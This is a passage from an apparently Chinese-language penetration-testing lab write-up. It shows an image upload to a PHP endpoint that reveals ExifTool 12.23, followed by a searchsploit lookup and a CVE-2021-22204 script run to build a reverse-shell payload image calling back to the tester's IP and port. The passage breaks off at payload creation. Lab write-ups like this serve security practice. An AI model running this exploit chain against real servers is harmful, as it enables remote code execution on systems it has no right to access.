</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------169621313238602050593908562572
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;myFile&#34;; filename=&#34;testme.jpg&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">......JFIF.....x.x.....C......................
</span></span><span class="line"><span class="cl">.....
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">..
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">............................C.......	..	.
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">.............................................................&#34;.....................................	
</span></span><span class="line"><span class="cl">.....................}........!1A..Qa.&#34;q.2....#B...R..$3br.	
</span></span><span class="line"><span class="cl">.....%&amp;&#39;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz.......................................................................................................	
</span></span><span class="line"><span class="cl">.....................w.......!1..AQ.aq.&#34;2...B....	#3R..br.
</span></span><span class="line"><span class="cl">.$4.%.....&amp;&#39;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................?..h~.x9..:$.........
</span></span><span class="line"><span class="cl">{.........wq....a.....&amp;...~u.E,..f......rk....Ox7..............	...k....o....;~...F.....%f.....2...{r48..I......a...9.r+.U...i.=...?..{D..5....&#39;.)o........h...-........
</span></span><span class="line"><span class="cl">w{....4n?.o........_......._..`......R..........w...y.3F......R..?.k..38O.R............
</span></span><span class="line"><span class="cl">[............7.h.......T......g	..
</span></span><span class="line"><span class="cl">[........?.Kx/..0...]...........4}J.`......?.Kx/..0...G.)o........k.......q..~f..R...5....&#39;.)o........h...-........
</span></span><span class="line"><span class="cl">w{....4n?.o...*]..F..3....-........
</span></span><span class="line"><span class="cl">.......@.?....q..~f......&gt;.K..h..fp...|...@(?...............j............4....Q.hb?.....Ox78.....4..
</span></span><span class="line"><span class="cl">x2I9.m.p\.m.........e;.?SY..J*.
</span></span><span class="line"><span class="cl">x.D./.C...{.I....i.........^?..&amp;.=bx..G......M..~&#34;x...xU..s.k.&lt;|.?...m..C...;.o..9.vK.......{u..9.].~.xb...M...q...0...-q..^..Y..cV9.k......#.|)....&#34;...y.....xV8..\ .15.^.-.S....F.Y....y..f.&lt;.&lt;.....7u......h.......?b...Z.&gt;3K+..y..`.p%.|.......v[....5._.s.&#34;...+.[c..d.....9;.@.$X...T...1D......+.._...%Ej.....
</span></span><span class="line"><span class="cl">.....D	E.SN.AE.U.&#34;..(...`..(.A`..(.@.QE...V.QE.....QE.Xo...-i.Vc..-h...{.S.7t.\.T~.....G...0.`.E.Ih	.+.~#.&lt;I1.I5..0S..L.k*...X....Q....E...`.../...@+.|/...............w...........z.z.u6.n..*.#4_I....qX...K..rU...........}+...S....pI....W......c...e....d......r...._^...[?....=.?.	+
</span></span><span class="line"><span class="cl">...8(Wt...?.IPA&amp;!.....Sn...%&#39;.....v...S&lt;.....U\.j...S...2..2(.1....b..#.C.....O..Er.....A..+..7.....j.?...+..TV&lt;y....e........X......../.&amp;.po..c.&#39;.t,.G...
</span></span><span class="line"><span class="cl">J.V....M.~ny_.....U.2*.W[..8..E.:.&#34;...k.4.....QA..)c.U.5H-f.H..=.u..V-..M..o...*3......I.78.2.R......b.Fw..+7\........?u#_......M.5..V.-&gt;.z.m...E=.........}O..rz..K.C~O.6...M........&gt;..J.]g\x...5...4....W../....[0
</span></span><span class="line"><span class="cl">	o:...........^=....$..?]..tc..s...k.....=....kc...E........I..N...........i...mu...s.......?...SG.d...^U.D......X...w....%.W.................2Uk...
</span></span><span class="line"><span class="cl">..A.v...~....3.W.GWs....0..j.!.R{WM.f..^..j.v..RLy&#39;.U..&gt;[.p+..c../..knQs.v.........5...........nd..k......x.......@.....fxg..y...O.0...lPb&#39;..y......=...t.b.Mh%...u..N+...........\..t.}..........Q....{.b.*.}+3G.l.._&gt;.u.z..\..
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...7*r..d.^q=.......&gt;..4#qwP$...m(]....f....`d..sz...,.?.....nn.......5;..t...81..&gt;......O.....5....B9......g.....g..+.,unv.....6...j.+8..e.......=k..O.........s.%..{U...?...SC.._.T.U.&gt;g#.#......#
</span></span><span class="line"><span class="cl">O+.W.........!o..|.h.w...4....:...$.q{......+.........&#34;...../.H....
</span></span><span class="line"><span class="cl">......&lt;g......j)s.ni....j./.k.x..;..K.2..t.Z.f...L....7...%...hW..................ek...........y.:.U....e...].GB....^..f.8{...U..&gt;..&#39;..h.{.&gt;.v.....J..n....=.k..].s&#39;.....KV...!.*...6#.%.&#39;..Ml..&gt;..C.q.&gt;.;..kN....0..pO.T..*.......q.$01Q..X...o....X.s...........X.....vt.&gt;.)
</span></span><span class="line"><span class="cl">..+..v.ZH....I...\x..W:.....e..QX.r;........|Iu....a-.E..(.u.m....*.K.,^9A..._C.B1k.])#]..*N......a.x..R..NE...R.....r.1......)..;uy....H...[.t.}}k...#.._iv^&amp;...H.]..........W...K...C....T...q.1.WV.n2.81..V..??.9!..u&#39;p......@...-|.....D=M{..y..r...}..oC..u%..#JE....}..wN..6..B
</span></span><span class="line"><span class="cl">dj.%....`.......-....z....e.,&gt;2?......W....o..Nw.rO~+....B..1...............9.....*....Z...k.h......9...u.m)h....&gt;..5&#34;...	..&amp;.....t..D....\..n...
</span></span><span class="line"><span class="cl">..Morar@..A.+....7..b2.U..L..B.6...*sS........3j..eA)...c..W.x/......e[K..$...5.T1...g..r.....w[....`...v....K.pO....C.K.....I.....k.v..Y./....V.i&gt;..mW.[.q.8...-)o.[.......
</span></span><span class="line"><span class="cl">.7O*.m.....O.E~w......	nG./,M#)\....K).nOZ....{._i.
</span></span><span class="line"><span class="cl">.....0y....2?b...{V..4t../..7.V&amp;t. d.*..G#.....|]....^..w...F=I#..4..C
</span></span><span class="line"><span class="cl">.u&lt;s.....[t.A,....{.dU=..c@.v.$......3(..
</span></span><span class="line"><span class="cl">.}?..qJ...&gt;=...
</span></span><span class="line"><span class="cl">[RM...
</span></span><span class="line"><span class="cl">o`.#^rjV&#34;.6...T.Jwq+j~#..dH....,)...N...vX^..2|.XVW.l.F.....&lt;.eV...\.5g.z.....dV.W..)......V...~.+.H.....2.^...0&lt;...B...&gt;.+:.......;`.....z.X..w#.	]..}k.x..H.Y.....0...~7....i:.7:y8.......t..2.......U].&lt;f.......$k,l1.oq]6i]...c.=...+.RH\J......:.....W.|..%.........}.=Lg...zr.U....jz..6.......~......e8.~O..o......&lt;`...V....W.....&lt;...E.z.c*(Qwg...gV`..f......&lt;.w..3.s.u... .._.._1Ol..a......j....O:.p`+:..y..y.#.,w.....%.l....z.c...F.j4.O+9&lt;...}u..|..08......+............}...x.;..y
</span></span><span class="line"><span class="cl">....{E...v...YT.q&gt;....
</span></span><span class="line"><span class="cl">s...C.Oi.&#34;D...pR[.nU...}......2,.2.Q.s.y......&#34;.Y...w|....r.........g&#39;.h|....Uc]w.&gt;..^..quh.3....=x.I.e.n.k..Jt...T.B.ta....=*...................U..|&#34;.4.=[...5?..Ev.l..,.....
</span></span><span class="line"><span class="cl">..G..1.op.J.cc....s...5oK./4..kk..D&lt;m8.z.q..\.C...R...w.M*[.	...nx..S..9..s............V6....5...~?].......L6...+.?g..........7......py&#39;#...|..q..u&gt;...&lt;.wNZ&amp;}..$d...{Z........?.y.....O.[E...%x4....}k.e
</span></span><span class="line"><span class="cl">O.........aD.Z;....}..~&amp;\.Z.....(....kB../&lt;.U.J.....*......39.7..}v..C...6.U...h....-.w;wc..Z.....q..o..+. ....d..y.vM.Wz............
</span></span><span class="line"><span class="cl">{(~Ys...+2...B.........x...
</span></span><span class="line"><span class="cl">..................g....b.J..\|..L.5..8.....|].M..{]Y..D..X/bk........../m.....:U;.....i.6......-.SI.....T..C+J..&lt;.8;!b?.-.....i..QM..}.W?&lt;l.U.y..
</span></span><span class="line"><span class="cl">o....r........&gt;.x..Z.......,..RU..9.b.~..(.m/&#34;`ZL......H.M.o.....|G...j...oc...v:c.~pi..2.Z..=.......$\|..j.1*.....+U........A......0....t.+.cb.........T...Z! Y.El?.....j..&lt;M...Z\\^....$...=+..%?.\...B....t.Q4..#........h...x..........^.p.\..|N..w...h......-..[].....k.&gt;+X...Oo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.#(o^y5.X|..i4|.i.*..6p...u..&lt;.5...R.!...x}.u..^..&gt;.]..9...).Wf|..uvt....V!eB..QA.,p*9..X....,q.yw..kw._..h.^I.k:.k.0).D.U......M..%...pE}.......&#39;........u...L....&amp;?......=+.....u......?3.....&gt;....O...........&gt;.8&lt;....j..0...S....T.......S......&#34;.J.....Tm.j...[.3.....X.+.&lt;q.=Zk
</span></span><span class="line"><span class="cl">.Z3}.r.y=..p(.REa.;.....Uj..8..^...$.N..{....H......V.....t[.~....I...^k..y.9...hrrF|._3..J.........d...sZ:..........u89..f.:..:S...cR.....Z...s.....ryW.6.l..........&#34;.T&amp;..J&#39;....&lt;..:.......W.@,..`.^......=..+...T.O..X&amp;x.y.N9.^...Q...Z...+....rk........y............7..m...a..A.q..........b_...GkaxG..5..Zf......-L.&lt;.....8..2..]._.)E.n.........&#34;..VQ.z...i&amp;..ou.....?....x^.4..Z.....Z.n..{U....._=_...l.R.&amp;..jq.|=......7........m....,.R+.~..h.....?.....Q&gt;X..O....F1...Mhk3.......?..1.Y...d...
</span></span><span class="line"><span class="cl">.+.?
</span></span><span class="line"><span class="cl">.OL......C...rI....W...B
</span></span><span class="line"><span class="cl">|..s.Q.[...y!......Oe..-....s......|d..4.....~....n..B..E}E..SE..e......\..PI.T..&gt;..../........p.....R.&gt;.._...y...h.=..f.p|..RT.....|~..m.I..c_.g
</span></span><span class="line"><span class="cl">...^..Th...V......,..{.Q.k.a..l.......6?.qT......SW9..xZ.........n..y$......l.t.i.....&#39;.brqY&gt;*.#...E.&gt;zM&amp;..y..@k...[;x.^.0.W.d8..&lt;.G.|E...JR..........1C.;o~....yO.(6.\.&gt;......|@R.*...?m.._..n.. .2.....s.MCc....R..U......G.W..	.o....
</span></span><span class="line"><span class="cl">s..q_&gt;xv36.l.n;.W.j.=:-..F..[....y..+.[.B.-.N........&gt;.&lt;...|...w.......#.._..O.L..99).V.i..........&amp;..]....=....w...J.S#....&lt;/....(......Zi|.....x...7...f......Y..vj..V.Z..)...J.....v.]t.....i&#39;.&#39;.Yk....I..&#39;......?....U=..E_...QU#	...h.C..EM..I.k...&gt;...cj... c.U.a_;...{..?:.K&amp;..N|....A_R........C^}l$*....2....~.^[.o!I&#34;1....`..W....|_.wC.....gtA. ..._&lt;x......).._i.Rq$|.........e...l..e....8...-...9.$......
</span></span><span class="line"><span class="cl">D.........etMcq%..............}......m.F.....m.&gt;..q.#...bU..X...9..q.&lt;w.....[7......7....X..W6.t...B.z........F.E:........5..v:f.U&#34;.;u8...{W/.....$....L.O...._!....s&gt;........l.k.Z......h.*G ........-.8l..8.qF0.V...r.y#x^k\...ul....).i~$U.....i......A..@.?...k.;..G$=.m.U..~..H.....$A....,...
</span></span><span class="line"><span class="cl">k_....7...o.x..bMQ-...q....6.
</span></span><span class="line"><span class="cl">A..[.oRY..%.p? k..Z..SIa.D&#34;.n..Q.......t..uQ,..E.M
</span></span><span class="line"><span class="cl">...}+...,.+....#...1...}VK...v..&lt;A.........
</span></span><span class="line"><span class="cl">/...M....nf..}q]
</span></span><span class="line"><span class="cl">../-...(...W.+.z..l.....1....hS..X#.j.....T8........#&#39;.....D(...J..g.u.^0`.0...3|.y....Z..&amp;....f...UN@&#39;.?Z...O..!x........;....G~....?.[x.I....U...}...x....~..2.B.|G.UQ.V...7.....&lt;k..#...F..n..Q.._8}-...&gt;(..,......!.+....g.oIP.,..Z}....s.I}.
</span></span><span class="line"><span class="cl">..._.|
</span></span><span class="line"><span class="cl">P$.&lt;..q.8.~m
</span></span><span class="line"><span class="cl">.....&lt;.*../...Fx....w.[.x.=7.q6..5....%|.......Ne]...I.....K...|Z...-...(........................._..........!...EhdEEK...(.:)Z..
</span></span><span class="line"><span class="cl">l.....*,.......QI.Mr..qw[.G...6:..w....$..85...&lt;
</span></span><span class="line"><span class="cl">.xgR[K.W...6....M.W	.i......[....fP=........i..;...&lt;eLF#..c.....i..Q.0.......M......&#39;..C....L...N...\...I.\6....1....rk....ZM3.&lt;&amp;..i...\..T.4G....{..,md..b.wm.......*.@~v?;{..V.|;....2.9j.=../...;.K.\.....-....zv......;.H$z.....2.P....Wv3....J.....6...../.........&#34;i..em.zl.....O.|M&gt;.[.w.|..=.....K.2..W....	&gt;.....c[L...^.M...... .C..r:.&lt;T&gt;....V..f.....h..g%.....&gt;^..f.~ZW?....J...............YL.S..W!......c...$.m......z......f....x.M..o.d......^0..#...F.*...........XL/..cS.^?.....p...........;....h./n5......W..7....H........-..	..Y#.D..~U.u..i...m.......R.+dv...+^hJ.B.#.....,...V..._E~...2x...6...@..R.......8 ..W...;N..3/.&#39;..z...%:..&#39;./....v....&#39;.....=..M_...QZ...QJ[.........E.;z.?u.\B.Z.w..&#39;.....I.!.~..........e.B..wg#..N.5.....e8.d..5..q....@.{........[.V...%.`.0P2Gj.&lt;/...a...e&lt;........u..W.	r...........`X.3.....E......?....S.?...........p.4.f.5..9a.yG.......s...*
</span></span><span class="line"><span class="cl">..=..5!.Ite.S_&gt;).{.!.[....oQ[:]...j..F...I..;C...]5m.L..k.r.......j..xX.k.
</span></span><span class="line"><span class="cl">......
</span></span><span class="line"><span class="cl">G..&lt;....Z8....d....H.)......tS.......J..sc....At.2B..9..C..5...uIq..,.+..`.j....j.6.&gt;f...D.....O.,......8y6&amp;h.....C..o.?........~k...]|.Gk..,...._;|f...Z..:Ky.lv..r......&amp;x....g...#|L...&lt;V...u7.&amp;...1..........S.	.0.e...!.R.+........?....r....p{W....]x..K..$.......^...-LT....R.
</span></span><span class="line"><span class="cl">R.g......K....E......G.......r...cH...]lRIc.......f...WM.NW....w....	..9..:W?p....w.....k.....W%-....Mt.&amp;......#.s..x.R.....2..[{yf...i....o....W3{.&amp;....z..D.%...I...;.=J%..T.......U..j.4{vy.F&gt;.....[q...J....F....o..
</span></span><span class="line"><span class="cl">...Qs..k.....O....6...A..e.^.l...3.....c{.e..&gt;Z..k_..J..8.3...R..KH.....Z..........(....(...(....6x.....&#34;............=k.{.zf.`c......&gt;K
</span></span><span class="line"><span class="cl">I0[........S....U.TR....M..Q.......,.}.s.
</span></span><span class="line"><span class="cl">.M....(..s..7$(....M.4.S..}...b.O.6t...{.j..{..n.
</span></span><span class="line"><span class="cl">.8rW......1U......%...[.m....]..m.v.1......[..s^...o#I.....?G4..g.I! qQ.8.
</span></span><span class="line"><span class="cl">......d......(_.....0...vc..5=.V...ki.,.n.z.k`....;v....P.w.._.?.]\.
</span></span><span class="line"><span class="cl">6...\Q.......n.!r..._......L...PI.....ZLcY...`~..5...&lt;4|-.K...]....5....R&lt;..|vf....Y.......h.CYZ..dY..*..?.&#34;..../.4N.+)..nY........6.........+v...R......!?).F..z(..{..F..5.3.7.W.+...G.yv..........3Is.^&#34;.$.Kg...}....$.W..G..).*y.....WQ.E.......
</span></span><span class="line"><span class="cl">!...+.|=.E.,y...........B..^B2KV.....)...+..&amp;..3..AUu.....%.:.#y..u).....J....J...^..X.....ye$.\F...b..J&gt;Z_..!...Z.....&gt;.kV....5....,........K_
</span></span><span class="line"><span class="cl">.$.V.(....5..k...v.i	;y.......8...89.....d..?.7.J.....}7....L^2!..k^3.....ks....V.AKL...3...T..........`Q.Rd..Z...R5.4P.QE........fk...!..&lt;.#.I@.Mi..W7...K.....e...&#34;.}.......7.w...*...b7...)3h..2j........:U.
</span></span><span class="line"><span class="cl">^k.u...&lt;.f.Z5f..=../	._....&gt;....s,....]...t.[.....~#..}.Q....h...9.`/.-..n!.....
</span></span><span class="line"><span class="cl">z...
</span></span><span class="line"><span class="cl">M&#34;&#39;:..aG#...U.\C..D.$.i.7.....G..`M.?...&lt;...U...X.&amp;.d.e_..^..Z.uo.x..$.......a..z.Cm
</span></span><span class="line"><span class="cl">....... O.RF.`.P+.m.[+v.`.e..v$.i....=....#..@..36....B.%..{..jS\.J........b.O..Go..Uw`.Uq3..q..&lt;47&lt;.........6uK.c,&gt;.G..............M;.....g.............m.?x.r7..=j..^=....C..HN..@..........\............K.+...O...+;.z..B....xz}rc=....k.&lt;7....6...........N..TB3&#39;S..Mz..m.F..I,.V..nN
</span></span><span class="line"><span class="cl">M....x....F.kw.... s....H..G./..m.As2...,...+K!..m...{[.,F7.+.V]..%...{2.. .?.......+{../z;.	5.......y..V...$...........m%.!..=y5.j.z.....&#39;..sYF..,.1..:....7...@.....
</span></span><span class="line"><span class="cl">.........!...f%..7.d...p?Z.my..............g.k./...[_..1$.m...._9}...7.&lt;......c...&#39;......?_.J......x.........Z.-.,xJH!........}.C.3........_w.M8.+....W....f..rW./.o	F.
</span></span><span class="line"><span class="cl">j....O..	...!..:.Z....................	...
</span></span><span class="line"><span class="cl">G&#39;./	+q.#..h..&gt;..J...w../../.y.../	.../.H..&lt;&amp;...Z.[....+..!..e.....J.tp...MF._.X....V..&#39;...?..Es:O...h.0.._Q.+.. p.9...1....Y....T.&lt;.V..i..9...;..\G...O...]&#34;vK..YX...@&#39;.......4+.....0..&#34;/,....:...&gt;mgM..n....&#39;yrq.2W..9....^kC..Na..Q..c..z...d..R..yy......~2..y....z&lt;2..A.......z...P|.....v.o....[..Z....X.4....	..^.:.........1.F..i$...cq}r.&#34;&lt;`U/.[.
</span></span><span class="line"><span class="cl">.$.P}Z1\e..?
</span></span><span class="line"><span class="cl">\......Z.....x.W......,...S.....4][..+j......h.-.Mt.m....v..&#34;E=..k.o...f.XV8..&amp;....&amp;.uD..._....0.....3...T...!m......	vL..z....-c...9.s]#..Co.....iyVL..6.9....N..	4..w.v...bd.=.s..a......Q.!.?j...	i..v...dx.g%x...e}.X...b..
</span></span><span class="line"><span class="cl">~.\...g._...d...Y.I..Nq.+..2|Q..Y......n.g.&amp;Bv.5.~ ./.M.Kyz..HI!z
</span></span><span class="line"><span class="cl">.7V....X.m.....|..j...y....x..B.......4:..r......?0._K.WR.5.6).|.A..z.W.Z..G..ak.......z..~8x3D....&amp;^9.	..VQ..dz...R|...Ue/..=.I........B..s...Ys|h....k.=.D...@.....0.O..*........&amp;Oc\Z.Z........j&#34;)...&lt;...&gt;f...h...n..t%	
</span></span><span class="line"><span class="cl">.........-....\....?...........K....j...!....^....v..k.r....U.M........P.b..FN....3......q..A~.......e...T....nE....R.+j..Q#]x%X......l..=5....t...A.?.U...............*.G.\..3j^..6.)...[.k..d.*..T...|g....T.:....B........lx
</span></span><span class="line"><span class="cl">.....1Hu..7K	1...|&#39;.....&#34;...\q..A.T.F...v$.[.\k..6V&gt;........A..f=..R.|-.f&gt;f...._....o.
</span></span><span class="line"><span class="cl">....|....wDQ.....WC..).......H....T............E..5...p.....r.....xy.Jcx.........4_....u(....S7.xv.5(...*yWa.Iw(7....G..&gt;....^.s.....?..M.m.IK....*...d..I.....J;.)9.&amp;,.4..o.Gn..*[..xZ.%..K.....m...4..=3T...4..7.+Oh..f|...u...x-..Gw.._.O......`..y.r..zl.r...R...?..[.k.&amp;...RVGI....G...~.T....,....#t.\..#z|c%[..|=.7W.....tM.#...W...a..m..DV$x~1..Y..z.y....R..e.|.4.}wQp-..}.6O.#..&gt;..?..jp..J=......V#._l.m..u...C..[
</span></span><span class="line"><span class="cl">...2....o|&lt;.O..pk....&lt;	..dx....N....k.....?./$.M,:?.......O.Y......2F:TL...G...M........0.
</span></span><span class="line"><span class="cl">....6.....G.....d...V...GE..4&lt;..........J.....f..[x....k.{L..9Yk.w....#P.6.........z.:}......h3Yg.....e$....5.H..r.......:......hk..A.......^1.I.....I7,..i.x.&lt;..........2..F....g.....G...w4.`[...ir.....e.........z..v...J...`....Q..a..6...{.._..k..^X..........3~2W.I...y.........O.U...&lt;...[..;~.I......|.3..zsh,.....1.R?...R..y..:.q.K..}...u...2...^.4.I9.R.b;gl.O.....WA.U......Y.C....L..#]....f;&amp;Z.q.Mk.qx.....\h....S}2...].UnN.p....z..=.|...{V...3.../E.....\Gg$.]I3.#q.y.e\....W...;...lr.!`~..o.Y..]:....mq.Q....../........s...uQ.-../...f.+..+.....E{G..3..6.?..J*...k..$\...........u7..k.5
</span></span><span class="line"><span class="cl">.H..r...n..&#34;..\Vg.u_
</span></span><span class="line"><span class="cl">..M....`........}...T....^.~........q^....5.E`.V.Xt#.....V#p...D.3...W.=............&#39;......c....7...1.....C.&lt;9~.....7.i...t..11&gt;......+p..O
</span></span><span class="line"><span class="cl">.m....{0.&lt;B?..H.j........I#....:.x.;n.......9C.....&lt;H|=.Wq..t=N{W.....m4....6.Xi.....k.....~....5...u..m.....-....+*.V*2...+.6......?.F...7...Y.......J.N..3..&gt;...]..:.......2.E.[
</span></span><span class="line"><span class="cl">N...i..#...V...J...
</span></span><span class="line"><span class="cl">h.N..U.....:..t.q....q*.c\.)...&#39;...bG...jF.&amp;..?..#........[.^.JO....s......*?.H...
</span></span><span class="line"><span class="cl">X......Cq.
</span></span><span class="line"><span class="cl">).....E....s.%.I..0.P..U..f?Z.&amp;..I!o..y..u....4...m..g.{D.&gt;.+7C....u...............aN:..&#39;
</span></span><span class="line"><span class="cl">.d~..\.&#39;S......U[....l...J.
</span></span><span class="line"><span class="cl">......L=&lt;..5.
</span></span><span class="line"><span class="cl">../.....W.js1...8.dMj....(....g..:.......M....}q.]..u..#.y.E...}k+....2..*...F....&gt;d...yos.....%c.|.W-.Gmu.+.....1.....+.I!...gu....?:......&amp;...._7x...=y&#39;..h....&gt;..6.k.$...&#34;...A.OM...o{...k....l.7v..1.C[...;Bw..q....E.K.........N.d.K....+...,K\C...1..
</span></span><span class="line"><span class="cl">.J.....~.|T..N.........@.+.......7b.....|.,m&gt;Y/.....P9.^..x.E..b..K.....Z...(...6...........k...6..V....
</span></span><span class="line"><span class="cl">p......b?.....S....&lt;B..+.?........(..#x|!Q......~..!.,*s.
</span></span><span class="line"><span class="cl">.-rc...d.n.}&amp;...;..6k.C.0...r.&lt;.. __.k...
</span></span><span class="line"><span class="cl">.......[o..J...w...u.&lt;...........|Q._Z..........o.q&#39;.V.&amp;..*...RQEs..5..E.*..E........E..)..((m*...kp..Sh..$z..O...&#39;.E..2....Z(.....;QE.,.~..Gz(..AR/..QA#_.Sh....QZ..|}......q...;......OE....w?..
</span></span><span class="line"><span class="cl">-----------------------------169621313238602050593908562572--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">Date: Thu, 27 Jan 2022 12:47:37 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 (Ubuntu)
</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">Content-Encoding: gzip
</span></span><span class="line"><span class="cl">Content-Length: 454
</span></span><span class="line"><span class="cl">Keep-Alive: timeout=5, max=100
</span></span><span class="line"><span class="cl">Connection: Keep-Alive
</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=UTF-8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">File uploaded successfully :)&lt;pre&gt;ExifTool Version Number         : 12.23
</span></span><span class="line"><span class="cl">File Name                       : phpopnW14.jpg
</span></span><span class="line"><span class="cl">Directory                       : /var/www/html/uploads
</span></span><span class="line"><span class="cl">File Size                       : 14 KiB
</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2022:01:27 14:47:37+02:00
</span></span><span class="line"><span class="cl">File Access Date/Time           : 2022:01:27 14:47:37+02:00
</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2022:01:27 14:47:37+02:00
</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
</span></span><span class="line"><span class="cl">File Type                       : JPEG
</span></span><span class="line"><span class="cl">File Type Extension             : jpg
</span></span><span class="line"><span class="cl">MIME Type                       : image/jpeg
</span></span><span class="line"><span class="cl">JFIF Version                    : 1.01
</span></span><span class="line"><span class="cl">Resolution Unit                 : inches
</span></span><span class="line"><span class="cl">X Resolution                    : 120
</span></span><span class="line"><span class="cl">Y Resolution                    : 120
</span></span><span class="line"><span class="cl">Image Width                     : 253
</span></span><span class="line"><span class="cl">Image Height                    : 257
</span></span><span class="line"><span class="cl">Encoding Process                : Baseline DCT, Huffman coding
</span></span><span class="line"><span class="cl">Bits Per Sample                 : 8
</span></span><span class="line"><span class="cl">Color Components                : 3
</span></span><span class="line"><span class="cl">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
</span></span><span class="line"><span class="cl">Image Size                      : 253x257
</span></span><span class="line"><span class="cl">Megapixels                      : 0.065
</span></span><span class="line"><span class="cl">&lt;/pre&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>尝试通过这个php文件上传接口上传，失败了</p>
<p>注意点返回包返回ExifTool版本为12.23，尝试搜索下漏洞，发现存在漏洞。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ searchsploit Exiftool 12.23
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                     <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">ExifTool 12.23 - Arbitrary Code Execution                          <span class="p">|</span> linux/local/50911.py
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Shellcodes: No Results
</span></span><span class="line"><span class="cl">Papers: No Results</span></span></code></pre></td></tr></table>
</div>
</div><p>因为这个py利用脚本需要下载几个工具，总报错。于是又从github找了另一个工具：https://github.com/AssassinUKG/CVE-2021-22204/blob/main/CVE-2021-22204.sh</p>
<p>准备一张图片，执行EXP</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ./cve-2021-22204.sh <span class="s2">&#34;reverseme 192.168.45.206 80&#34;</span> image.jpg
</span></span><span class="line"><span class="cl">   _____   _____   ___ __ ___ _    ___ ___ ___ __  _ _  
</span></span><span class="line"><span class="cl">  / __<span class="se">\ \ </span>/ / __<span class="p">|</span>_<span class="p">|</span>_  <span class="o">)</span>  <span class="se">\_</span>  <span class="o">)</span> <span class="p">|</span>__<span class="p">|</span>_  <span class="o">)</span>_  <span class="o">)</span>_  <span class="o">)</span>  <span class="se">\|</span> <span class="p">|</span> <span class="p">|</span>                                              
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">(</span>__ <span class="se">\ </span>V /<span class="p">|</span> _<span class="p">|</span>___/ / <span class="o">()</span> / /<span class="p">|</span> <span class="p">|</span>___/ / / / / / <span class="o">()</span> <span class="p">|</span>_  _<span class="p">|</span>                                             
</span></span><span class="line"><span class="cl">  <span class="se">\_</span>__<span class="p">|</span> <span class="se">\_</span>/ <span class="p">|</span>___<span class="p">|</span> /___<span class="se">\_</span>_/___<span class="p">|</span>_<span class="p">|</span>  /___/___/___<span class="se">\_</span>_/  <span class="p">|</span>_<span class="p">|</span>                                              
</span></span><span class="line"><span class="cl">                                                                                                     
</span></span><span class="line"><span class="cl">Creating payload
</span></span><span class="line"><span class="cl">IP: 192.168.45.206
</span></span><span class="line"><span class="cl">PORT: <span class="m">80</span>
